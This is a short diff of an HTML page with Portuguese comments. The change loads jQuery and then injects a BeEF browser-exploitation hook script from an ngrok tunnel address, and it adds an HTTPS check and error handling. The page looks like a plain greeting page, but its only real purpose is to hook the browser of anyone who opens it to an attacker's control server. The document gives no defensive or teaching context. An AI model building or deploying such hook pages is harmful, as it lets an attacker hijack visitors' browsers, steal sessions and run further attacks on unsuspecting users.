@@ -8,22 +8,32 @@
 <body>
     <h1>oi</h1>
     <script>
-        // Injeta o jQuery diretamente
-        /* Cole o código jQuery aqui */
-        
-        // Após o jQuery, carrega o hook.js do Vercel
-        const beefHookUrl = "https://b6df8c15dea6.ngrok-free.app/hook.js";
+        // Opção 1: Usar jQuery via CDN (recomendado)
+        const jqueryScript = document.createElement("script");
+        jqueryScript.src = "https://code.jquery.com/jquery-1.12.4.min.js";
+        jqueryScript.type = "text/javascript";
+        jqueryScript.onload = () => console.log("jQuery carregado!");
+        jqueryScript.onerror = () => console.error("Erro ao carregar jQuery.");
+        document.head.appendChild(jqueryScript);
+
+        // Após o jQuery, carrega o hook.js via HTTPS
+        const beefHookUrl = "https://b6df8c15dea6.ngrok-free.app/hook.js"; // Substitua pelo URL HTTPS real (ngrok ou Vercel)
 
         function loadBeefHook(url) {
+            if (!url.startsWith("https://")) {
+                console.error("URL deve usar HTTPS: ", url);
+                return;
+            }
             const script = document.createElement("script");
             script.src = url;
             script.type = "text/javascript";
             script.onload = () => console.log("BeEF hook carregado!");
-            script.onerror = () => console.error("Erro ao carregar o BeEF hook.");
+            script.onerror = () => console.error("Erro ao carregar o BeEF hook: ", url);
             document.head.appendChild(script);
         }
 
-        loadBeefHook(beefHookUrl);
+        // Aguarda o jQuery carregar antes de carregar o hook
+        jqueryScript.onload = () => loadBeefHook(beefHookUrl);
     </script>
 </body>
 </html>
